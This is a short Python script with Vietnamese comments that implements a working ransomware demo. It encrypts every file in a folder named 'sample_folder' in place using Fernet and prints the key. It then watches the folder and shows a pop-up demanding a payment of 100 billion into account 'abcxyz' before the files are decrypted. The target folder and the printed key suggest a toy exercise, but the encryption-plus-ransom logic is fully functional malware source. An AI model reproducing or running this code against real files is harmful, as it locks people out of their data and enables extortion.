from cryptography.fernet import Fernet
import os
import tkinter as tk
from tkinter import messagebox, simpledialog
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
import time

# Tạo một khóa mã hóa và in ra màn hình
key = Fernet.generate_key()
print("Key mã hóa là:", key.decode())  # In khóa mã hóa ra dưới dạng chuỗi
cipher = Fernet(key)

# Folder chứa các tệp cần mã hóa
folder_path = 'sample_folder'

# Biến flag để kiểm tra xem các tệp đã được giải mã hay chưa
files_decrypted = False

# Mã hóa các tệp trong folder
def encrypt_files():
    for filename in os.listdir(folder_path):
        file_path = os.path.join(folder_path, filename)
        if os.path.isfile(file_path):
            with open(file_path, 'rb') as file:
                file_data = file.read()
            encrypted_data = cipher.encrypt(file_data)
            with open(file_path, 'wb') as file:
                file.write(encrypted_data)
    print("Tất cả các tệp trong thư mục đã được mã hóa!")

# Giải mã các tệp nếu nhập đúng khóa
def decrypt_files(input_key):
    global files_decrypted
    if input_key.encode() == key:
        for filename in os.listdir(folder_path):
            file_path = os.path.join(folder_path, filename)
            if os.path.isfile(file_path):
                with open(file_path, 'rb') as file:
                    encrypted_data = file.read()
                decrypted_data = cipher.decrypt(encrypted_data)
                with open(file_path, 'wb') as file:
                    file.write(decrypted_data)
        files_decrypted = True  # Đặt flag = True sau khi giải mã thành công
        messagebox.showinfo("Thành công", "Tất cả các tệp đã được giải mã!")
    else:
        messagebox.showerror("Lỗi", "Mã giải mã không đúng. Vui lòng thử lại.")

# Tạo pop-up yêu cầu mã giải mã
def show_decryption_popup():
    global files_decrypted
    if files_decrypted:  # Kiểm tra xem các tệp đã được giải mã chưa
        return
    root = tk.Tk()
    root.withdraw()  # Ẩn cửa sổ chính
    messagebox.showwarning("Thông báo", "Phải nhập mã giải mã để mở khóa các tệp, để có mã hãy nạp 100 tỷ vào tài khoản abcxyz")
    # Hiển thị hộp thoại nhập
    input_key = simpledialog.askstring("Nhập mã giải mã", "Vui lòng nhập mã giải mã:")
    if input_key:
        decrypt_files(input_key)
    root.destroy()

# Định nghĩa một handler để giám sát folder
class FolderEventHandler(FileSystemEventHandler):
    def on_any_event(self, event):
        # Hiển thị pop-up yêu cầu mã giải mã khi có bất kỳ sự kiện nào trong thư mục
        show_decryption_popup()

# Mã hóa các tệp trong folder
encrypt_files()

# Bắt đầu giám sát folder
event_handler = FolderEventHandler()
observer = Observer()
observer.schedule(event_handler, path=folder_path, recursive=False)
observer.start()

try:
    # Chạy giám sát liên tục cho đến khi bạn dừng thủ công
    print("Đang giám sát thư mục. Hãy mở thư mục để hiển thị thông báo yêu cầu giải mã.")
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    observer.stop()

observer.join()
